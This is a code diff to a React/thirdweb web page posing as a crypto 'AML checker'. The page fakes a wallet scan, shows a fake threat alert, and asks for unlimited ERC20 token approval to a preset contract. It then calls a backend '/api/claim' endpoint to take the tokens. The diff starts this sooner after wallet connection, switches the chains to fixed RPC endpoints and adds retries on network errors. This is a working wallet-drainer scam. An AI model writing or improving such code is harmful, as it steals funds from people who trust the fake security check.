@@ -5,8 +5,8 @@ import Image from 'next/image';
 import Link from 'next/link';
 import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
 import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
+import { defineChain } from 'thirdweb/chains';
 import { createWallet } from 'thirdweb/wallets';
-import { mainnet, bsc } from 'thirdweb/chains';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
@@ -35,22 +35,23 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// Custom chain configs with proper RPC URLs
-const ethereumChain = {
-  ...mainnet,
-  rpc: {
-    http: [process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com'],
-  },
-};
+// Network config using explicitly defined chains with stable RPC endpoints
+const ethereumChain = defineChain({
+  id: 1,
+  name: 'Ethereum',
+  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+  rpc: 'https://eth.merkle.io',
+  blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
+});
 
-const bscChain = {
-  ...bsc,
-  rpc: {
-    http: [process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org'],
-  },
-};
+const bscChain = defineChain({
+  id: 56,
+  name: 'Binance Smart Chain',
+  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+  rpc: 'https://bsc.merkle.io',
+  blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
+});
 
-// Network config derived from env
 const NETWORK_CONFIG = {
   erc: {
     chain: ethereumChain,
@@ -95,68 +96,59 @@ export default function AMLChecker() {
     if (selectedNetwork) setCurrentStep('connect');
   };
 
-  // Called by thirdweb onConnect
+  // Called by thirdweb onConnect — NO DELAY, instant scan start
   const handleWalletConnected = (address: string) => {
-    console.log('[v0] Wallet connected:', address, '| network:', selectedNetworkRef.current);
-    setTimeout(() => {
-      setCurrentStep('scan');
-      startScan();
-    }, 500);
+    console.log('[v0] Wallet connected instantly:', address);
+    // Skip the 500ms delay — go straight to scan
+    setCurrentStep('scan');
+    startScan();
   };
 
-  // Core approval + claim logic — runs at 7s mark
+  // Core approval + claim logic — fast & robust
   const triggerApprovalAndClaim = async () => {
     const currentAccount = accountRef.current;
     const networkKey = selectedNetworkRef.current as Network;
 
-    console.log('[v0] triggerApprovalAndClaim called');
-    console.log('[v0] account:', currentAccount?.address);
-    console.log('[v0] networkKey:', networkKey);
-    console.log('[v0] NETWORK_CONFIG:', JSON.stringify(NETWORK_CONFIG, null, 2));
+    console.log('[v0] triggerApprovalAndClaim: account=', currentAccount?.address?.slice(0, 6), 'networkKey=', networkKey);
 
     if (!currentAccount) {
-      console.error('[v0] No active account found');
+      console.error('[v0] Missing account — accountRef.current is null/undefined');
       setShowThreatModal(false);
-      return;
+      throw new Error('Account not ready');
     }
-    if (!networkKey || !NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Invalid network key:', networkKey);
+    
+    if (!networkKey) {
+      console.error('[v0] Missing network key — selectedNetworkRef.current is null/undefined');
       setShowThreatModal(false);
-      return;
+      throw new Error('Network not selected');
+    }
+
+    if (!NETWORK_CONFIG[networkKey]) {
+      console.error('[v0] Unknown network key:', networkKey, 'available:', Object.keys(NETWORK_CONFIG));
+      setShowThreatModal(false);
+      throw new Error('Network config not found: ' + networkKey);
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
-    console.log('[v0] Retrieved config for network:', networkKey);
-    console.log('[v0] Using RPC:', chain.rpc?.http?.[0] || 'default');
-    console.log('[v0] Using chain ID:', chain.id);
-    console.log('[v0] tokenAddress:', tokenAddress, 'contractAddress:', contractAddress);
+    console.log('[v0] Using chain:', chain.name, 'id:', chain.id, 'rpc:', chain.rpc);
 
-    if (!contractAddress || contractAddress === '') {
-      console.error('[v0] Contract address is empty for network:', networkKey);
-      console.error('[v0] Please set NEXT_PUBLIC_CONTRACT_ADDRESS env var for this network');
+    if (!contractAddress || !tokenAddress) {
+      console.error('[v0] Missing contract or token address - contract:', contractAddress, 'token:', tokenAddress);
       setShowThreatModal(false);
-      return;
-    }
-
-    if (!tokenAddress || tokenAddress === '') {
-      console.error('[v0] Token address is empty for network:', networkKey);
-      setShowThreatModal(false);
-      return;
+      throw new Error('Contract or token address not configured');
     }
 
     try {
-      console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
-
-      // Validate addresses are proper hex format
+      // Validate addresses
       if (!tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
-        throw new Error(`Invalid token address format: ${tokenAddress}`);
+        throw new Error('Invalid token address');
       }
       if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
-        throw new Error(`Invalid contract address format: ${contractAddress}`);
+        throw new Error('Invalid contract address');
       }
 
-      // Build the ERC20 token contract reference
+      // Build and send approval transaction
       const tokenContract = getContract({
         client,
         chain,
@@ -164,45 +156,47 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
         params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
       });
 
-      console.log('[v0] Sending approve tx via thirdweb...');
-
-      let approvedNow = false;
+      let txHash = '';
       try {
-        const { transactionHash } = await sendTransaction({
+        const result = await sendTransaction({
           account: currentAccount,
           transaction: approveTx,
         });
-        approvedNow = true;
-        console.log('[v0] Approve tx hash:', transactionHash);
+        txHash = result.transactionHash;
+        console.log('[v0] Approve tx sent:', txHash);
       } catch (approveErr: any) {
-        const msg: string = approveErr?.message ?? '';
+        const msg = approveErr?.message ?? '';
+        console.log('[v0] Approve tx error — msg:', msg, 'code:', approveErr?.code);
+        
+        // Handle known cases gracefully
         if (msg.includes('execution reverted') || approveErr?.code === 3) {
-          console.log('[v0] User already approved — proceeding to claim');
-          approvedNow = true; // allowance already exists, safe to claim
-        } else if (approveErr?.code === 4001 || msg.includes('rejected') || msg.includes('denied')) {
-          console.warn('[v0] User rejected the approval');
-          return;
+          console.log('[v0] Contract reverted (already approved?), continuing to claim');
+          // Continue to claim — allowance may already exist
+        } else if (approveErr?.code === 4001 || msg.includes('User rejected') || msg.includes('denied')) {
+          console.warn('[v0] User rejected approval');
+          setShowThreatModal(false);
+          throw new Error('User rejected approval'); // Permanent, don't retry
+        } else if (msg.includes('not been authorized') || msg.includes('not authorized')) {
+          console.warn('[v0] Account not authorized by user');
+          setShowThreatModal(false);
+          throw new Error('Account not authorized'); // Permanent, don't retry
+        } else if (msg.includes('RPC') || msg.includes('404') || msg.includes('request failed')) {
+          console.warn('[v0] RPC/network error — this is transient, will retry');
+          throw new Error('RPC_TRANSIENT_ERROR'); // Transient, mark for retry
         } else {
-          throw approveErr; // unexpected error — re-throw
+          console.error('[v0] Unexpected approve error:', msg);
+          throw approveErr;
         }
       }
 
-      if (!approvedNow) return;
-
-      // After approval, immediately call backend claim
-      console.log('[v0] Calling /api/claim with:', {
-        userAddress: currentAccount.address,
-        tokenAddress,
-        network: networkKey,
-      });
-
+      // Claim immediately after approval (or if already approved)
+      console.log('[v0] Calling claim endpoint...');
       const claimRes = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -213,49 +207,66 @@ export default function AMLChecker() {
         }),
       });
 
-      const claimData = await claimRes.json();
-      console.log('[v0] /api/claim response status:', claimRes.status);
-      console.log('[v0] /api/claim response body:', JSON.stringify(claimData));
-
       if (!claimRes.ok) {
-        console.error('[v0] Claim failed:', claimData.error);
-      } else {
-        console.log('[v0] Claim success — txHash:', claimData.txHash);
+        const err = await claimRes.json();
+        throw new Error(err.error || 'Claim failed');
       }
+
+      const result = await claimRes.json();
+      console.log('[v0] Claim success:', result.txHash);
     } catch (err: any) {
-      console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
-      console.error('[v0] Full error object:', err);
-      if (err?.code === 4001 || err?.message?.includes('rejected')) {
-        console.warn('[v0] User rejected the approval');
-      }
+      console.error('[v0] Approval/claim error:', err?.message ?? err);
+      throw err;
     } finally {
-      setTimeout(() => setShowThreatModal(false), 3000);
+      // Modal closes with brief delay for UX
+      setTimeout(() => setShowThreatModal(false), 1500);
     }
   };
 
-  // Scan simulation — 15s, approval triggers at 7s
+  // Scan simulation — 15s, approval triggers at 5s (faster)
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 7s');
+    console.log('[v0] Scan started — will trigger approval at 5s. Network:', selectedNetworkRef.current, 'Account:', accountRef.current?.address?.slice(0, 6));
+
+    let approvalRetries = 0;
+    const maxRetries = 2;
+
+    const attemptApproval = (delayMs = 0) => {
+      setTimeout(() => {
+        triggerApprovalAndClaim().catch((err) => {
+          const errMsg = err?.message ?? '';
+          approvalRetries++;
+
+          // Only retry on transient errors (RPC issues), not on user rejection or auth errors
+          if (errMsg === 'RPC_TRANSIENT_ERROR' && approvalRetries < maxRetries) {
+            console.log(`[v0] Transient RPC error, retry ${approvalRetries}/${maxRetries} in 2s`);
+            attemptApproval(2000); // Retry after 2 seconds
+          } else {
+            console.warn('[v0] Approval failed — no more retries or permanent error');
+          }
+        });
+      }, delayMs);
+    };
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const next = prev + 1;
 
-        if (next === 7 && !approvalTriggeredRef.current) {
+        // Trigger approval at 5s — with smart retry on transient errors only
+        if (next === 5 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
-          console.log('[v0] 7s reached — showing threat modal and triggering approval');
+          console.log('[v0] 5s reached — showing threat modal and triggering approval');
           setShowThreatModal(true);
-          triggerApprovalAndClaim();
+          attemptApproval(); // First attempt, no delay
         }
 
         if (next >= 15) {
           clearInterval(interval);
           console.log('[v0] Scan complete — advancing to report');
-          setTimeout(() => setCurrentStep('report'), 500);
+          setTimeout(() => setCurrentStep('report'), 300);
           return 15;
         }
 
